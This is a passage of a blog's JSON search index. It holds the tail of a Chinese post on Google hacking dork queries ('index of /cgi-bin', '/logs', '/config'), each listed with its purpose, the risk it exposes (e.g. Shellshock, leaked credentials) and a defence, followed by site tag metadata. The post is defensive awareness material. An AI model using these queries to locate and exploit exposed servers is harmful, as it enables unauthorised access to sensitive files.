密钥、脚本或日志。 防御：确保 &#x2F;root 目录权限为 700，禁止 Web 服务器访问。 9. “index of &#x2F;cgi-bin” 用途：查找 CGI 脚本目录（常见于老旧系统）。 风险：利用 CGI 漏洞（如 Shellshock）执行远程代码。 防御：升级或禁用 CGI 模块，设置严格的脚本权限。 10. “index of &#x2F;logs” 用途：暴露日志文件目录（如访问日志、错误日志）。 风险：日志中可能包含敏感信息（如 SQL 错误中的数据库密码）。 防御：将日志存储在非 Web 目录，定期清理并加密存档。 11. “index of &#x2F;config” 用途：查找配置文件目录（如数据库连接信息）。 风险：泄露 config.php、settings.ini 等文件。 防御：将配置文件移出 Web 目录，使用环境变量注入配置。","categories":[],"tags":[{"name":"googlehacking","slug":"googlehacking","permalink":"https://cury-w.github.io/tags/googlehacking/"}]},{"title":"begin","slug":"begin","date":"2025-06-23T11:35:28.000Z","updated":"2025-06-23T11:35:28.830Z","comments":true,"path":"2025/06/23/begin/","link":"","permalink":"https://cury-w.github.io/2025/06/23/begin/","excerpt":"","text":"","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"应急溯源","slug":"应急溯源","permalink":"https://cury-w.github.io/tags/%E5%BA%94%E6%80%A5%E6%BA%AF%E6%BA%90/"},{"name":"404","slug":"404","permalink":"https://cury-w.github.io/tags/404/"},{"name":"js","slug":"js","permalink":"https://cury-w.github.io/tags/js/"},{"name":"centos7","slug":"centos7","permalink":"https://cury-w.github.io/tags/centos7/"},{"name":"googlehacking","slug":"googlehacking","permalink":"https://cury-w.github.io/tags/googlehacking/"}]}